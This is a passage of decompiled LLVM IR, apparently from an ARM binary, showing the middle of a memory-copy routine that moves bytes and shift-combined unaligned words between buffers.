  %v2_20788 = phi i32 [ %v1_206b0, %dec_label_pc_206c8 ], [ %v2_20788.pre, %.thread126 ]
  %v0_20784 = phi i32 [ %v0_206b0, %dec_label_pc_206c8 ], [ %v0_20784.pre, %.thread126 ]
  %v0_2077c = phi i32 [ %v1_206c8, %dec_label_pc_206c8 ], [ %v0_2077c.pre, %.thread126 ]
  %v1_2077c = sub i32 4, %v0_2077c
  store i32 %v1_2077c, i32* @ip, align 4
  %v1_20780 = add i32 %v1_2077c, -2
  %v3_20780 = sub i32 1, %v1_2077c
  %v4_20780 = and i32 %v3_20780, %v1_2077c
  %v5_20780 = icmp slt i32 %v4_20780, 0
  store i1 %v5_20780, i1* %cpsr_v.global-to-local, align 1
  %v6_20780 = icmp slt i32 %v1_20780, 0
  store i1 %v6_20780, i1* %cpsr_n.global-to-local, align 1
  %v7_20780 = icmp eq i32 %v1_2077c, 2
  store i1 %v7_20780, i1* %cpsr_z.global-to-local, align 1
  %v1_20784 = inttoptr i32 %v0_20784 to i8*
  %v2_20784 = load i8, i8* %v1_20784, align 1
  %v3_20784 = zext i8 %v2_20784 to i32
  store i32 %v3_20784, i32* @r3, align 4
  %v5_20784 = add i32 %v0_20784, 1
  store i32 %v5_20784, i32* @r1, align 4
  %v3_20788 = inttoptr i32 %v2_20788 to i8*
  store i8 %v2_20784, i8* %v3_20788, align 1
  %v4_20788 = load i32, i32* @r0, align 4
  %v5_20788 = add i32 %v4_20788, 1
  store i32 %v5_20788, i32* @r0, align 4
  %v0_2078c = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_2078c = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_2078c = xor i1 %v0_2078c, %v1_2078c
  br i1 %v2_2078c, label %.thread127, label %bb145

bb145:                                            ; preds = %dec_label_pc_2077c
  %v3_2078c = load i32, i32* @r1, align 4
  %v4_2078c = inttoptr i32 %v3_2078c to i8*
  %v5_2078c = load i8, i8* %v4_2078c, align 1
  %v6_2078c = zext i8 %v5_2078c to i32
  store i32 %v6_2078c, i32* @r3, align 4
  %v8_2078c = add i32 %v3_2078c, 1
  store i32 %v8_2078c, i32* @r1, align 4
  %v6_20790 = inttoptr i32 %v5_20788 to i8*
  store i8 %v5_2078c, i8* %v6_20790, align 1
  %v7_20790 = load i32, i32* @r0, align 4
  %v8_20790 = add i32 %v7_20790, 1
  store i32 %v8_20790, i32* @r0, align 4
  %v1_20794.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_20794.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread127

.thread127:                                       ; preds = %dec_label_pc_2077c, %bb145
  %v7_20798 = phi i32 [ %v8_20790, %bb145 ], [ %v5_20788, %dec_label_pc_2077c ]
  %v2_20798 = phi i1 [ %v2_20794.pre, %bb145 ], [ %v1_2078c, %dec_label_pc_2077c ]
  %v1_20798 = phi i1 [ %v1_20794.pre, %bb145 ], [ %v0_2078c, %dec_label_pc_2077c ]
  %v0_20794 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_20794 = xor i1 %v2_20798, %v1_20798
  %v4_20794 = or i1 %v0_20794, %v3_20794
  br i1 %v4_20794, label %.thread128, label %bb146

bb146:                                            ; preds = %.thread127
  %v5_20794 = load i32, i32* @r1, align 4
  %v6_20794 = inttoptr i32 %v5_20794 to i8*
  %v7_20794 = load i8, i8* %v6_20794, align 1
  %v8_20794 = zext i8 %v7_20794 to i32
  store i32 %v8_20794, i32* @r3, align 4
  %v10_20794 = add i32 %v5_20794, 1
  store i32 %v10_20794, i32* @r1, align 4
  %v8_20798 = inttoptr i32 %v7_20798 to i8*
  store i8 %v7_20794, i8* %v8_20798, align 1
  %v9_20798 = load i32, i32* @r0, align 4
  %v10_20798 = add i32 %v9_20798, 1
  store i32 %v10_20798, i32* @r0, align 4
  br label %.thread128

.thread128:                                       ; preds = %.thread127, %bb146
  %v0_208cc77 = phi i32 [ %v10_20798, %bb146 ], [ %v7_20798, %.thread127 ]
  %v0_2079c = load i32, i32* %r2.global-to-local, align 4
  %v1_2079c = load i32, i32* @ip, align 4
  %v2_2079c = sub i32 %v0_2079c, %v1_2079c
  store i32 %v2_2079c, i32* %r2.global-to-local, align 4
  %v4_2079c = xor i32 %v1_2079c, %v0_2079c
  %v5_2079c = xor i32 %v2_2079c, %v0_2079c
  %v6_2079c = and i32 %v5_2079c, %v4_2079c
  %v7_2079c = icmp slt i32 %v6_2079c, 0
  store i1 %v7_2079c, i1* %cpsr_v.global-to-local, align 1
  %v8_2079c = icmp slt i32 %v2_2079c, 0
  store i1 %v8_2079c, i1* %cpsr_n.global-to-local, align 1
  %v9_2079c = icmp eq i32 %v0_2079c, %v1_2079c
  store i1 %v9_2079c, i1* %cpsr_z.global-to-local, align 1
  %v2_207a0 = xor i1 %v8_2079c, %v7_2079c
  br i1 %v2_207a0, label %bb140, label %dec_label_pc_207a4

dec_label_pc_207a4:                               ; preds = %.thread128
  %v0_207a4 = load i32, i32* @r1, align 4
  %v1_207a4 = urem i32 %v0_207a4, 4
  store i32 %v1_207a4, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_207a4 = icmp eq i32 %v1_207a4, 0
  store i1 %v2_207a4, i1* %cpsr_z.global-to-local, align 1
  %extract.t131 = trunc i32 %v0_207a4 to i2
  br i1 %v2_207a4, label %dec_label_pc_206d8, label %dec_label_pc_207ac

dec_label_pc_207ac:                               ; preds = %dec_label_pc_206d0, %dec_label_pc_207a4
  %v0_208cc76 = phi i32 [ %v1_206b0, %dec_label_pc_206d0 ], [ %v0_208cc77, %dec_label_pc_207a4 ]
  %v0_20834 = phi i32 [ %v2_206c0, %dec_label_pc_206d0 ], [ %v2_2079c, %dec_label_pc_207a4 ]
  %v0_207b4.off0 = phi i2 [ %extract.t, %dec_label_pc_206d0 ], [ %extract.t131, %dec_label_pc_207a4 ]
  %v0_207ac = phi i32 [ %v0_206b0, %dec_label_pc_206d0 ], [ %v0_207a4, %dec_label_pc_207a4 ]
  %v1_207ac = and i32 %v0_207ac, -4
  store i32 %v1_207ac, i32* %r1.global-to-local, align 4
  %v1_207b0 = inttoptr i32 %v1_207ac to i32*
  %v2_207b0 = load i32, i32* %v1_207b0, align 4
  store i32 %v2_207b0, i32* %lr.global-to-local, align 4
  %v4_207b0 = add i32 %v1_207ac, 4
  store i32 %v4_207b0, i32* %r1.global-to-local, align 4
  %v1_2082c = add i32 %v0_20834, -12
  %v3_2082c = sub i32 11, %v0_20834
  %v4_2082c = and i32 %v3_2082c, %v0_20834
  %v5_2082c = icmp slt i32 %v4_2082c, 0
  store i1 %v5_2082c, i1* %cpsr_v.global-to-local, align 1
  %v6_2082c = icmp slt i32 %v1_2082c, 0
  store i1 %v6_2082c, i1* %cpsr_n.global-to-local, align 1
  %v7_2082c = icmp eq i32 %v0_20834, 12
  store i1 %v7_2082c, i1* %cpsr_z.global-to-local, align 1
  %v2_20830 = xor i1 %v6_2082c, %v5_2082c
  switch i2 %v0_207b4.off0, label %dec_label_pc_207c0 [
    i2 -1, label %dec_label_pc_20898
    i2 -2, label %dec_label_pc_2082c
  ]

dec_label_pc_207c0:                               ; preds = %dec_label_pc_207ac
  br i1 %v2_20830, label %dec_label_pc_2080c, label %dec_label_pc_207c8

dec_label_pc_207c8:                               ; preds = %dec_label_pc_207c0
  store i32 %v1_2082c, i32* %r2.global-to-local, align 4
  %v3_207cc = load i32, i32* @r4, align 4
  store i32 %v3_207cc, i32* %stack_var_-16, align 4
  %v6_207cc = load i32, i32* @r5, align 4
  store i32 %v6_207cc, i32* %stack_var_-12, align 4
  br label %dec_label_pc_207d0

dec_label_pc_207d0:                               ; preds = %dec_label_pc_207d0.dec_label_pc_207d0_crit_edge, %dec_label_pc_207c8
  %v0_207f4 = phi i32 [ %v12_207f4, %dec_label_pc_207d0.dec_label_pc_207d0_crit_edge ], [ %v0_208cc76, %dec_label_pc_207c8 ]
  %v0_207d4 = phi i32 [ %v0_207d4.pre, %dec_label_pc_207d0.dec_label_pc_207d0_crit_edge ], [ %v4_207b0, %dec_label_pc_207c8 ]
  %v0_207d0 = phi i32 [ %v0_207d0.pre, %dec_label_pc_207d0.dec_label_pc_207d0_crit_edge ], [ %v2_207b0, %dec_label_pc_207c8 ]
  %v3_207d0 = udiv i32 %v0_207d0, 256
  store i32 %v3_207d0, i32* %r3.global-to-local, align 4
  %v1_207d4 = inttoptr i32 %v0_207d4 to i32*
  %v2_207d4 = load i32, i32* %v1_207d4, align 4
  store i32 %v2_207d4, i32* %r4.global-to-local, align 4
  %v3_207d4 = add i32 %v0_207d4, 4
  %v4_207d4 = inttoptr i32 %v3_207d4 to i32*
  %v5_207d4 = load i32, i32* %v4_207d4, align 4
  store i32 %v5_207d4, i32* %r5.global-to-local, align 4
  %v6_207d4 = add i32 %v0_207d4, 8
  %v7_207d4 = inttoptr i32 %v6_207d4 to i32*
  %v8_207d4 = load i32, i32* %v7_207d4, align 4
  store i32 %v8_207d4, i32* %ip.global-to-local, align 4
  %v9_207d4 = add i32 %v0_207d4, 12
  %v10_207d4 = inttoptr i32 %v9_207d4 to i32*
  %v11_207d4 = load i32, i32* %v10_207d4, align 4
  store i32 %v11_207d4, i32* %lr.global-to-local, align 4
  %v12_207d4 = add i32 %v0_207d4, 16
  store i32 %v12_207d4, i32* %r1.global-to-local, align 4
  %v4_207d8 = mul i32 %v2_207d4, 16777216
  %v5_207d8 = or i32 %v4_207d8, %v3_207d0
  store i32 %v5_207d8, i32* @r3, align 4
  %v3_207dc = udiv i32 %v2_207d4, 256
  %v4_207e0 = mul i32 %v5_207d4, 16777216
  %v5_207e0 = or i32 %v4_207e0, %v3_207dc
  store i32 %v5_207e0, i32* %r4.global-to-local, align 4
  %v3_207e4 = udiv i32 %v5_207d4, 256
  %v4_207e8 = mul i32 %v8_207d4, 16777216
  %v5_207e8 = or i32 %v4_207e8, %v3_207e4
  store i32 %v5_207e8, i32* %r5.global-to-local, align 4
  %v3_207ec = udiv i32 %v8_207d4, 256
  %v4_207f0 = mul i32 %v11_207d4, 16777216
  %v5_207f0 = or i32 %v4_207f0, %v3_207ec
  store i32 %v5_207f0, i32* @ip, align 4
  %v1_207f4 = inttoptr i32 %v0_207f4 to i32*
  store i32 %v5_207d8, i32* %v1_207f4, align 4
  %v3_207f4 = add i32 %v0_207f4, 4
  %v4_207f4 = inttoptr i32 %v3_207f4 to i32*
  %v5_207f4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_207f4, i32* %v4_207f4, align 4
  %v6_207f4 = add i32 %v0_207f4, 8
  %v7_207f4 = inttoptr i32 %v6_207f4 to i32*
  %v8_207f4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_207f4, i32* %v7_207f4, align 4
  %v9_207f4 = add i32 %v0_207f4, 12
  %v10_207f4 = inttoptr i32 %v9_207f4 to i32*
  %v11_207f4 = load i32, i32* @ip, align 4
  store i32 %v11_207f4, i32* %v10_207f4, align 4
  %v12_207f4 = add i32 %v0_207f4, 16
  store i32 %v12_207f4, i32* @r0, align 4
  %v0_207f8 = load i32, i32* %r2.global-to-local, align 4
  %v1_207f8 = add i32 %v0_207f8, -16
  store i32 %v1_207f8, i32* %r2.global-to-local, align 4
  %v3_207f8 = sub i32 15, %v0_207f8
  %v4_207f8 = and i32 %v3_207f8, %v0_207f8
  %v5_207f8 = icmp slt i32 %v4_207f8, 0
  %v6_207f8 = icmp slt i32 %v1_207f8, 0
  %v2_207fc = xor i1 %v6_207f8, %v5_207f8
  br i1 %v2_207fc, label %dec_label_pc_20800, label %dec_label_pc_207d0.dec_label_pc_207d0_crit_edge

dec_label_pc_207d0.dec_label_pc_207d0_crit_edge:  ; preds = %dec_label_pc_207d0
  %v0_207d0.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_207d4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_207d0

dec_label_pc_20800:                               ; preds = %dec_label_pc_207d0
  %v2_20800 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_20800, i32* @r4, align 4
  %v5_20800 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_20800, i32* @r5, align 4
  %v1_20804 = add i32 %v0_207f8, -4
  store i32 %v1_20804, i32* %r2.global-to-local, align 4
  %v3_20804 = add i32 %v0_207f8, 2147483632
  %v4_20804 = and i32 %v1_20804, %v3_20804
  %v5_20804 = icmp slt i32 %v4_20804, 0
  store i1 %v5_20804, i1* %cpsr_v.global-to-local, align 1
  %v6_20804 = icmp slt i32 %v1_20804, 0
  store i1 %v6_20804, i1* %cpsr_n.global-to-local, align 1
  %v7_20804 = icmp eq i32 %v1_20804, 0
  store i1 %v7_20804, i1* %cpsr_z.global-to-local, align 1
  %v2_20808 = xor i1 %v6_20804, %v5_20804
  br i1 %v2_20808, label %dec_label_pc_20824, label %dec_label_pc_2080c

dec_label_pc_2080c:                               ; preds = %dec_label_pc_20800, %dec_label_pc_207c0, %dec_label_pc_2080c
  %v1_20818 = phi i32 [ %v4_20818, %dec_label_pc_2080c ], [ %v12_207f4, %dec_label_pc_20800 ], [ %v0_208cc76, %dec_label_pc_207c0 ]
  %v0_2080c = load i32, i32* %lr.global-to-local, align 4
  %v3_2080c = udiv i32 %v0_2080c, 256
  store i32 %v3_2080c, i32* %ip.global-to-local, align 4
  %v0_20810 = load i32, i32* %r1.global-to-local, align 4
  %v1_20810 = inttoptr i32 %v0_20810 to i32*
  %v2_20810 = load i32, i32* %v1_20810, align 4
  store i32 %v2_20810, i32* %lr.global-to-local, align 4
  %v4_20810 = add i32 %v0_20810, 4
  store i32 %v4_20810, i32* %r1.global-to-local, align 4
  %v4_20814 = mul i32 %v2_20810, 16777216
  %v5_20814 = or i32 %v4_20814, %v3_2080c
  store i32 %v5_20814, i32* @ip, align 4
  %v2_20818 = inttoptr i32 %v1_20818 to i32*
  store i32 %v5_20814, i32* %v2_20818, align 4
  %v3_20818 = load i32, i32* @r0, align 4
  %v4_20818 = add i32 %v3_20818, 4
  store i32 %v4_20818, i32* @r0, align 4
  %v0_2081c = load i32, i32* %r2.global-to-local, align 4
  %v1_2081c = add i32 %v0_2081c, -4
  store i32 %v1_2081c, i32* %r2.global-to-local, align 4
  %v3_2081c = sub i32 3, %v0_2081c
  %v4_2081c = and i32 %v3_2081c, %v0_2081c
  %v5_2081c = icmp slt i32 %v4_2081c, 0
  %v6_2081c = icmp slt i32 %v1_2081c, 0
  %v2_20820 = xor i1 %v6_2081c, %v5_2081c
  br i1 %v2_20820, label %dec_label_pc_20824.loopexit, label %dec_label_pc_2080c

dec_label_pc_20824.loopexit:                      ; preds = %dec_label_pc_2080c
  %v7_2081c = icmp eq i32 %v0_2081c, 4
  store i1 %v5_2081c, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_2081c, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_2081c, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_20824

dec_label_pc_20824:                               ; preds = %dec_label_pc_20824.loopexit, %dec_label_pc_20800
  %v0_2074c59 = phi i32 [ %v1_2081c, %dec_label_pc_20824.loopexit ], [ %v1_20804, %dec_label_pc_20800 ]
  %v0_20824 = load i32, i32* %r1.global-to-local, align 4
  %v1_20824 = add i32 %v0_20824, -3
  store i32 %v1_20824, i32* @r1, align 4
  br label %bb140

dec_label_pc_2082c:                               ; preds = %dec_label_pc_207ac
  br i1 %v2_20830, label %dec_label_pc_20878, label %dec_label_pc_20834

dec_label_pc_20834:                               ; preds = %dec_label_pc_2082c
  store i32 %v1_2082c, i32* %r2.global-to-local, align 4
  %v3_20838 = load i32, i32* @r4, align 4
  store i32 %v3_20838, i32* %stack_var_-16, align 4
  %v6_20838 = load i32, i32* @r5, align 4
  store i32 %v6_20838, i32* %stack_var_-12, align 4
  br label %dec_label_pc_2083c

dec_label_pc_2083c:                               ; preds = %dec_label_pc_2083c.dec_label_pc_2083c_crit_edge, %dec_label_pc_20834
  %v0_20860 = phi i32 [ %v12_20860, %dec_label_pc_2083c.dec_label_pc_2083c_crit_edge ], [ %v0_208cc76, %dec_label_pc_20834 ]
  %v0_20840 = phi i32 [ %v0_20840.pre, %dec_label_pc_2083c.dec_label_pc_2083c_crit_edge ], [ %v4_207b0, %dec_label_pc_20834 ]
  %v0_2083c = phi i32 [ %v0_2083c.pre, %dec_label_pc_2083c.dec_label_pc_2083c_crit_edge ], [ %v2_207b0, %dec_label_pc_20834 ]
  %v3_2083c = udiv i32 %v0_2083c, 65536
  store i32 %v3_2083c, i32* %r3.global-to-local, align 4
  %v1_20840 = inttoptr i32 %v0_20840 to i32*
  %v2_20840 = load i32, i32* %v1_20840, align 4
  store i32 %v2_20840, i32* %r4.global-to-local, align 4
  %v3_20840 = add i32 %v0_20840, 4
  %v4_20840 = inttoptr i32 %v3_20840 to i32*
  %v5_20840 = load i32, i32* %v4_20840, align 4
  store i32 %v5_20840, i32* %r5.global-to-local, align 4
  %v6_20840 = add i32 %v0_20840, 8
  %v7_20840 = inttoptr i32 %v6_20840 to i32*
  %v8_20840 = load i32, i32* %v7_20840, align 4
  store i32 %v8_20840, i32* %ip.global-to-local, align 4
  %v9_20840 = add i32 %v0_20840, 12
  %v10_20840 = inttoptr i32 %v9_20840 to i32*
  %v11_20840 = load i32, i32* %v10_20840, align 4
  store i32 %v11_20840, i32* %lr.global-to-local, align 4
  %v12_20840 = add i32 %v0_20840, 16
  store i32 %v12_20840, i32* %r1.global-to-local, align 4
  %v4_20844 = mul i32 %v2_20840, 65536
  %v5_20844 = or i32 %v4_20844, %v3_2083c
  store i32 %v5_20844, i32* @r3, align 4
  %v3_20848 = udiv i32 %v2_20840, 65536
  %v4_2084c = mul i32 %v5_20840, 65536
  %v5_2084c = or i32 %v4_2084c, %v3_20848
  store i32 %v5_2084c, i32* %r4.global-to-local, align 4
  %v3_20850 = udiv i32 %v5_20840, 65536
  %v4_20854 = mul i32 %v8_20840, 65536
  %v5_20854 = or i32 %v4_20854, %v3_20850
  store i32 %v5_20854, i32* %r5.global-to-local, align 4
  %v3_20858 = udiv i32 %v8_20840, 65536
  %v4_2085c = mul i32 %v11_20840, 65536
  %v5_2085c = or i32 %v4_2085c, %v3_20858
  store i32 %v5_2085c, i32* @ip, align 4
  %v1_20860 = inttoptr i32 %v0_20860 to i32*
  store i32 %v5_20844, i32* %v1_20860, align 4
  %v3_20860 = add i32 %v0_20860, 4
  %v4_20860 = inttoptr i32 %v3_20860 to i32*
  %v5_20860 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_20860, i32* %v4_20860, align 4
  %v6_20860 = add i32 %v0_20860, 8
  %v7_20860 = inttoptr i32 %v6_20860 to i32*
  %v8_20860 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_20860, i32* %v7_20860, align 4
  %v9_20860 = add i32 %v0_20860, 12
  %v10_20860 = inttoptr i32 %v9_20860 to i32*
  %v11_20860 = load i32, i32* @ip, align 4
  store i32 %v11_20860, i32* %v10_20860, align 4
  %v12_20860 = add i32 %v0_20860, 16
  store i32 %v12_20860, i32* @r0, align 4
  %v0_20864 = load i32, i32* %r2.global-to-local, align 4
  %v1_20864 = add i32 %v0_20864, -16
  store i32 %v1_20864, i32* %r2.global-to-local, align 4
  %v3_20864 = sub i32 15, %v0_20864
  %v4_20864 = and i32 %v3_20864, %v0_20864
  %v5_20864 = icmp slt i32 %v4_20864, 0
  %v6_20864 = icmp slt i32 %v1_20864, 0
  %v2_20868 = xor i1 %v6_20864, %v5_20864
  br i1 %v2_20868, label %dec_label_pc_2086c, label %dec_label_pc_2083c.dec_label_pc_2083c_crit_edge

dec_label_pc_2083c.dec_label_pc_2083c_crit_edge:  ; preds = %dec_label_pc_2083c
  %v0_2083c.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_20840.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_2083c

dec_label_pc_2086c:                               ; preds = %dec_label_pc_2083c
  %v2_2086c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_2086c, i32* @r4, align 4
  %v5_2086c = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_2086c, i32* @r5, align 4
  %v1_20870 = add i32 %v0_20864, -4
  store i32 %v1_20870, i32* %r2.global-to-local, align 4
  %v3_20870 = add i32 %v0_20864, 2147483632
  %v4_20870 = and i32 %v1_20870, %v3_20870
  %v5_20870 = icmp slt i32 %v4_20870, 0
  store i1 %v5_20870, i1* %cpsr_v.global-to-local, align 1
  %v6_20870 = icmp slt i32 %v1_20870, 0
  store i1 %v6_20870, i1* %cpsr_n.global-to-local, align 1
  %v7_20870 = icmp eq i32 %v1_20870, 0
  store i1 %v7_20870, i1* %cpsr_z.global-to-local, align 1
  %v2_20874 = xor i1 %v6_20870, %v5_20870
  br i1 %v2_20874, label %dec_label_pc_20890, label %dec_label_pc_20878

dec_label_pc_20878:                               ; preds = %dec_label_pc_2086c, %dec_label_pc_2082c, %dec_label_pc_20878
  %v1_20884 = phi i32 [ %v4_20884, %dec_label_pc_20878 ], [ %v12_20860, %dec_label_pc_2086c ], [ %v0_208cc76, %dec_label_pc_2082c ]
  %v0_20878 = load i32, i32* %lr.global-to-local, align 4
  %v3_20878 = udiv i32 %v0_20878, 65536
  store i32 %v3_20878, i32* %ip.global-to-local, align 4
  %v0_2087c = load i32, i32* %r1.global-to-local, align 4
  %v1_2087c = inttoptr i32 %v0_2087c to i32*
  %v2_2087c = load i32, i32* %v1_2087c, align 4
  store i32 %v2_2087c, i32* %lr.global-to-local, align 4
  %v4_2087c = add i32 %v0_2087c, 4
  store i32 %v4_2087c, i32* %r1.global-to-local, align 4
  %v4_20880 = mul i32 %v2_2087c, 65536
  %v5_20880 = or i32 %v4_20880, %v3_20878
  store i32 %v5_20880, i32* @ip, align 4
  %v2_20884 = inttoptr i32 %v1_20884 to i32*
  store i32 %v5_20880, i32* %v2_20884, align 4
  %v3_20884 = load i32, i32* @r0, align 4
  %v4_20884 = add i32 %v3_20884, 4
  store i32 %v4_20884, i32* @r0, align 4
  %v0_20888 = load i32, i32* %r2.global-to-local, align 4
  %v1_20888 = add i32 %v0_20888, -4
  store i32 %v1_20888, i32* %r2.global-to-local, align 4
  %v3_20888 = sub i32 3, %v0_20888
  %v4_20888 = and i32 %v3_20888, %v0_20888
  %v5_20888 = icmp slt i32 %v4_20888, 0
  %v6_20888 = icmp slt i32 %v1_20888, 0
  %v2_2088c = xor i1 %v6_20888, %v5_20888
  br i1 %v2_2088c, label %dec_label_pc_20890.loopexit, label %dec_label_pc_20878

dec_label_pc_20890.loopexit:                      ; preds = %dec_label_pc_20878
  %v7_20888 = icmp eq i32 %v0_20888, 4
  store i1 %v5_20888, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_20888, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_20888, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_20890

dec_label_pc_20890:                               ; preds = %dec_label_pc_20890.loopexit, %dec_label_pc_2086c
  %v0_2074c60 = phi i32 [ %v1_20888, %dec_label_pc_20890.loopexit ], [ %v1_20870, %dec_label_pc_2086c ]
  %v0_20890 = load i32, i32* %r1.global-to-local, align 4
  %v1_20890 = add i32 %v0_20890, -2
  store i32 %v1_20890, i32* @r1, align 4
  br label %bb140

dec_label_pc_20898:                               ; preds = %dec_label_pc_207ac
  br i1 %v2_20830, label %dec_label_pc_208e4, label %dec_label_pc_208a0

dec_label_pc_208a0:                               ; preds = %dec_label_pc_20898
  store i32 %v1_2082c, i32* %r2.global-to-local, align 4
  %v3_208a4 = load i32, i32* @r4, align 4
  store i32 %v3_208a4, i32* %stack_var_-16, align 4
  %v6_208a4 = load i32, i32* @r5, align 4
  store i32 %v6_208a4, i32* %stack_var_-12, align 4
  br label %dec_label_pc_208a8

dec_label_pc_208a8:                               ; preds = %dec_label_pc_208a8.dec_label_pc_208a8_crit_edge, %dec_label_pc_208a0
  %v0_208cc = phi i32 [ %v12_208cc, %dec_label_pc_208a8.dec_label_pc_208a8_crit_edge ], [ %v0_208cc76, %dec_label_pc_208a0 ]
  %v0_208ac = phi i32 [ %v0_208ac.pre, %dec_label_pc_208a8.dec_label_pc_208a8_crit_edge ], [ %v4_207b0, %dec_label_pc_208a0 ]
  %v0_208a8 = phi i32 [ %v0_208a8.pre, %dec_label_pc_208a8.dec_label_pc_208a8_crit_edge ], [ %v2_207b0, %dec_label_pc_208a0 ]
  %v3_208a8 = udiv i32 %v0_208a8, 16777216
  store i32 %v3_208a8, i32* %r3.global-to-local, align 4
  %v1_208ac = inttoptr i32 %v0_208ac to i32*
  %v2_208ac = load i32, i32* %v1_208ac, align 4
  store i32 %v2_208ac, i32* %r4.global-to-local, align 4
  %v3_208ac = add i32 %v0_208ac, 4
  %v4_208ac = inttoptr i32 %v3_208ac to i32*
  %v5_208ac = load i32, i32* %v4_208ac, align 4
  store i32 %v5_208ac, i32* %r5.global-to-local, align 4
  %v6_208ac = add i32 %v0_208ac, 8
  %v7_208ac = inttoptr i32 %v6_208ac to i32*
  %v8_208ac = load i32, i32* %v7_208ac, align 4
  store i32 %v8_208ac, i32* %ip.global-to-local, align 4
  %v9_208ac = add i32 %v0_208ac, 12
  %v10_208ac = inttoptr i32 %v9_208ac to i32*
  %v11_208ac = load i32, i32* %v10_208ac, align 4
  store i32 %v11_208ac, i32* %lr.global-to-local, align 4
  %v12_208ac = add i32 %v0_208ac, 16
  store i32 %v12_208ac, i32* %r1.global-to-local, align 4
  %v4_208b0 = mul i32 %v2_208ac, 256
  %v5_208b0 = or i32 %v4_208b0, %v3_208a8
  store i32 %v5_208b0, i32* @r3, align 4
  %v3_208b4 = udiv i32 %v2_208ac, 16777216
  %v4_208b8 = mul i32 %v5_208ac, 256
  %v5_208b8 = or i32 %v4_208b8, %v3_208b4
  store i32 %v5_208b8, i32* %r4.global-to-local, align 4
  %v3_208bc = udiv i32 %v5_208ac, 16777216
  %v4_208c0 = mul i32 %v8_208ac, 256
  %v5_208c0 = or i32 %v4_208c0, %v3_208bc
  store i32 %v5_208c0, i32* %r5.global-to-local, align 4
  %v3_208c4 = udiv i32 %v8_208ac, 16777216
  %v4_208c8 = mul i32 %v11_208ac, 256
  %v5_208c8 = or i32 %v4_208c8, %v3_208c4
  store i32 %v5_208c8, i32* @ip, align 4
  %v1_208cc = inttoptr i32 %v0_208cc to i32*
  store i32 %v5_208b0, i32* %v1_208cc, align 4
  %v3_208cc = add i32 %v0_208cc, 4
  %v4_208cc = inttoptr i32 %v3_208cc to i32*
  %v5_208cc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_208cc, i32* %v4_208cc, align 4
  %v6_208cc = add i32 %v0_208cc, 8
  %v7_208cc = inttoptr i32 %v6_208cc to i32*
  %v8_208cc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_208cc, i32* %v7_208cc, align 4
  %v9_208cc = add i32 %v0_208cc, 12
  %v10_208cc = inttoptr i32 %v9_208cc to i32*
  %v11_208cc = load i32, i32* @ip, align 4
  store i32 %v11_208cc, i32* %v10_208cc, align 4
  %v12_208cc = add i32 %v0_208cc, 16
  store i32 %v12_208cc, i32* @r0, align 4
  %v0_208d0 = load i32, i32* %r2.global-to-local, align 4
  %v1_208d0 = add i32 %v0_208d0, -16
  store i32 %v1_208d0, i32* %r2.global-to-local, align 4
  %v3_208d0 = sub i32 15, %v0_208d0
  %v4_208d0 = and i32 %v3_208d0, %v0_208d0
  %v5_208d0 = icmp slt i32 %v4_208d0, 0
  %v6_208d0 = icmp slt i32 %v1_208d0, 0
  %v2_208d4 = xor i1 %v6_208d0, %v5_208d0
  br i1 %v2_208d4, label %dec_label_pc_208d8, label %dec_label_pc_208a8.dec_label_pc_208a8_crit_edge

dec_label_pc_208a8.dec_label_pc_208a8_crit_edge:  ; preds = %dec_label_pc_208a8
  %v0_208a8.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_208ac.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_208a8

dec_label_pc_208d8:                               ; preds = %dec_label_pc_208a8
  %v2_208d8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_208d8, i32* @r4, align 4
  %v5_208d8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_208d8, i32* @r5, align 4
  %v1_208dc = add i32 %v0_208d0, -4
  store i32 %v1_208dc, i32* %r2.global-to-local, align 4
  %v3_208dc = add i32 %v0_208d0, 2147483632
  %v4_208dc = and i32 %v1_208dc, %v3_208dc
  %v5_208dc = icmp slt i32 %v4_208dc, 0
  store i1 %v5_208dc, i1* %cpsr_v.global-to-local, align 1
  %v6_208dc = icmp slt i32 %v1_208dc, 0
  store i1 %v6_208dc, i1* %cpsr_n.global-to-local, align 1
  %v7_208dc = icmp eq i32 %v1_208dc, 0
  store i1 %v7_208dc, i1* %cpsr_z.global-to-local, align 1
  %v2_208e0 = xor i1 %v6_208dc, %v5_208dc
  br i1 %v2_208e0, label %dec_label_pc_208fc, label %dec_label_pc_208e4

dec_label_pc_208e4:                               ; preds = %dec_label_pc_208d8, %dec_label_pc_20898, %dec_label_pc_208e4
  %v1_208f0 = phi i32 [ %v4_208f0, %dec_label_pc_208e4 ], [ %v12_208cc, %dec_label_pc_208d8 ], [ %v0_208cc76, %dec_label_pc_20898 ]
  %v0_208e4 = load i32, i32* %lr.global-to-local, align 4
  %v3_208e4 = udiv i32 %v0_208e4, 16777216
  store i32 %v3_208e4, i32* %ip.global-to-local, align 4
  %v0_208e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_208e8 = inttoptr i32 %v0_208e8 to i32*
  %v2_208e8 = load i32, i32* %v1_208e8, align 4
